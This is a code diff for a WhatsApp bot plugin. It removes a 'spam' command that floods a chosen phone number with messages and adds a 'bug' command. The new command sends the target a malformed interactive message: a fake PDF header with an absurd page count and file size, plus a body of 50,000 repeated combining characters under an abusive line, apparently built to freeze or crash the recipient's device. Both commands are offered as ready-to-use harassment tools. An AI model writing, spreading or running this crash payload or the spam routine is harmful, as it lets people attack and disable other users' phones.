@@ -1,47 +1,59 @@
-const { cmd } = require('../lib/command');
+const { cmd ,commands } = require('../command');
+const { exec } = require('child_process');
+const config = require('../config');
+const {sleep} = require('../lib/functions')
 
 cmd({
-  pattern: 'spam',
-  desc: 'Owner-only stealth spam with large message',
-  category: 'tools',
-  filename: __filename,
-}, async (conn, m, text) => {
+  pattern: "bug",
+  use: ".canvasbug <@user> or <number>",
+  category: "fun",
+  desc: "Canvas Bug Function by Didula Rashmika",
+  filename: __filename
+}, async (conn, m, mek, { args, reply }) => {
+  if (!args[0]) return await reply("*Reply to a user or provide a number!* (ex: .bug 9471xxxxxxx)");
+
+  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  let uitext = "𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐃𝐄𝐕𝐈𝐂𝐄 𝐁𝐀𝐁𝐘 " + "꧀".repeat(50000);
+
   try {
-    // Not remove this line – this is base64 encoded allowed number
-    const encoded = 'OTQ3NzM0MTY0NzhAcy53aGF0c2FwcC5uZXQ=';
-    const allowedJID = Buffer.from(encoded, 'base64').toString('utf-8');
+    await conn.relayMessage(target, {
+      groupMentionedMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              documentMessage: {
+                url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
+                mimetype: 'application/pdf',
+                fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
+                fileLength: "999999999",
+                pageCount: 0x9184e729fff,
+                mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
+                fileName: "unidentifiedMessageType",
+                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
+                mediaKeyTimestamp: "1715880173",
+                contactVcard: true
+              },
+              title: "",
+              hasMediaAttachment: true
+            },
+            body: {
+              text: uitext
+            },
+            nativeFlowMessage: {},
+            contextInfo: {
+              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+              groupMentions: [{ groupJid: "1@newsletter", groupSubject: "tske" }]
+            }
+          }
+        }
+      }
+    }, { participant: { jid: target } }, { messageId: null });
 
-    // Developer-only restriction
-    if (m.sender !== allowedJID) {
-      return m.reply(
-        '❌ *මෙම විධානය භාවිතා කළ හැක්කේ බොට් සංවර්ධකයාට පමණි* ⚠️\n' +
-        '❌ *This command can only be used by the bot developer* ⚠️'
-      );
-    }
-
-    // Validate text input (target number)
-    if (!text) return m.reply('👻 කරුණාකර spam කරන phone number එක add කරන්න\n\nඋදා: *.spam 94771234567*');
-
-    // Format JID (must be like 9477xxxxxxx@s.whatsapp.net)
-    const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-
-    // Spam message setup
-    const unit = 'Luxalgo👻👻👻';   // Spam content
-    const repeatCount = 20000;      // How many times to repeat
-    const chunkSize = 4000;         // WhatsApp limit (per message)
-
-    const hugeMessage = unit.repeat(1); // single large message
-
-    // Break into chunks to avoid WhatsApp limit errors
-    for (let i = 0; i < hugeMessage.length; i += chunkSize) {
-      const part = hugeMessage.slice(i, i + chunkSize);
-      await conn.sendMessage(target, { text: part }, { ephemeralExpiration: 1 });
-      await new Promise(res => setTimeout(res, 800)); // Wait between sends
-    }
-
-    await m.reply('✅ Successfully sent spam attack 💣');
-
-  } catch (err) {
-    m.reply('⚠️ Error:\n' + err.message);
+    await reply("✅ Canvas Bug sent to: " + target);
+  } catch (e) {
+    console.error(e);
+    await reply("❌ Failed to send bug message.");
   }
 });
